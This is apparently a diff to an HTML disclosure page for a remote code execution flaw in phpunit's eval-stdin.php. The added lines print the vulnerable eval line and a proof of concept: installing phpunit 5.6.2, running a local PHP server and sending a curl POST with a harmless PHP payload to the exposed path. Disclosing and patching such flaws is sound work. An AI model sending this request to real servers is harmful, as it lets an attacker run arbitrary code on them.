@@ -33,6 +33,47 @@
 				<p>
 					Usually <code>phpunit</code> is deployed using <code>composer</code>, a very popular dependency manager for PHP. In most cases <code>phpunit</code> isn't required for the production environment, but nonetheless it is installed. Placing composer modules into web accessible directory is another common mistake that allows direct exploitation of this vulnerability.
 				</p>
+				<p>
+					The vulnerability was accidentally patched by Bob Weinand in Nov 2016 without any security advisory.
+				</p>
+				<p>
+					Despite the fact that the fixed version is available for several months, there are still thousands of servers on the Internet that have a vulnerable library installed. So we decided to publicly disclose this vulnerability.
+				</p>
+				<h3>Details</h3>
+				<p>
+					Vulnerability is located in <code>/phpunit/src/Util/PHP/eval-stdin.php</code> file. Before patch this file contained
+				</p>
+					<pre><code class="php">eval('?>'.file_get_contents('php://input'));</code></pre>
+				<p>
+					that could be used to run arbitrary PHP code.
+				</p>
+				<h3>PoC</h3>
+				<p>
+					For PoC purpose you can do following (suppose you have <code>php</code> and <code>composer</code> already installed):
+				</p>
+				<ol>
+					<li>
+						<p>
+							Install vulnerable version of phpunit, e.g. <code>5.6.2</code>
+						</p>
+						<pre><code class="bash">$ composer require phpunit/phpunit:5.6.2</code></pre>
+					</li>
+					<li>
+						<p>
+							Run PHP internal web server with webroot in the same directory and custom port, e.g. <code>8888</code>:		
+						</p>
+						<pre><code class="bash">$ php -S 127.0.0.1:8888</code></pre>
+					</li>
+					<li>
+						<p>
+							Use <code>curl</code> to send <code>POST</code> request. Body (<code>--data</code>) should contains payload:		
+						</p>
+						<pre><code class="bash">$ curl --data "&lt;?php echo(pi());" http://localhost:8888/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></pre>
+					</li>
+				</ol>
+				<p>
+					you should see &pi; value in the response.
+				</p>
 				<h2>FAQ</h2>
 				<h3>Is my site vulnerable?</h3>
 				<p>
@@ -81,7 +122,7 @@
 					</li>
 					<li>
 						<p>
-							Disable direct access to the <code>composer</code> packages. For that place <code>.htaccess</code> file to <code>/vendor</code> folder:
+							Disable direct access to the <code>composer</code> packages by placing <code>.htaccess</code> file to <code>/vendor</code> folder:
 						</p>
 						<pre style="margin-left: 0"><code class="apache">Deny from all</code></pre>
 					</li>
